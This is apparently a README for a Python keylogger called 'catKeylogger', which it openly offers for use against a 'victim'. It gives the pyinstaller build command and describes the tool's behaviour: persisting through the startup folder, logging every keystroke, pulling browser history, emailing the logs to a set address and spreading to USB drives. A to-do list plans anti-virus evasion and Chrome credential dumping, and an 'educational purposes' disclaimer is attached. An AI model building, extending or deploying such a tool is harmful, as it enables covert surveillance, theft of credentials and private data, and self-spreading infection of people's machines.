# catKeylogger

replicability functions that are contained in notes and the phish script have not yet been throughouly tested

An exe file must first be created using pyinstaller --onefile --noconsole cat.py

After the cat.exe application is ran for the first time cat.exe will copy itself to the victim's startup folder

cat.exe will then begin to record every keystroke made by the victim, storing all relevant keystrokes in a .txt file

cat.exe will extract the browsing history of every internet browser present on the victim's computer and store it in a .json file

Periodically, an email will be sent to the specified address containing the .txt and .json files

Every time the victim starts their computer, cat.exe will run

Any subsequent flash drive plugged into the victim's machine will have cat.exe copied onto it

The developer is not responsible for damage caused through misuse of this program. This program was created for educational purposes.


To do:

Reduce usage

Anti-virus evasion

Encrypt text before sending emails

Chromecredential dumping
